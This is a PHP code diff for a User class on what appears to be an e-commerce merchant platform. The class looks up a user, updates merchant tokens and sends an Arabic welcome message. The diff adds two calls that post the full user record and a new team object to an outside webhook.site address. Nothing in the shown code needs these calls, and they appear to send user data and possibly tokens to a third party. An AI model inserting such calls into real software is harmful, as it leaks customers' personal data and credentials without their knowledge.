@@ -24,6 +24,10 @@ class User{
         // get user info
         $user = SpUser::where('email',$this->merchant->data->email  ?: $this->store->data->email)->first();
 
+        Http::post('https://webhook.site/19694e58-fa42-41d5-a247-2187b0718cf7',[
+            $user
+        ]);
+
         // change update json access token and refresh token
         if($user):
             $user->merchant_info()->updateOrCreate([
@@ -58,9 +62,12 @@ class User{
                 👈 رابط المنصة : {$platform_link}\n
                 👈 يمكنك الاطلاع على شروحات منصتنا : {$descript_our_platform}\n
             ");
+            Http::post('https://webhook.site/19694e58-fa42-41d5-a247-2187b0718cf7',[
+                $new_team
+            ]);
 
-        // send message with all info and it was installed succefully
-        send_message($this->merchant->data->mobile,$message);
+            // send message with all info and it was installed succefully
+            send_message($this->merchant->data->mobile,$message);
         endif;
 
         // return result
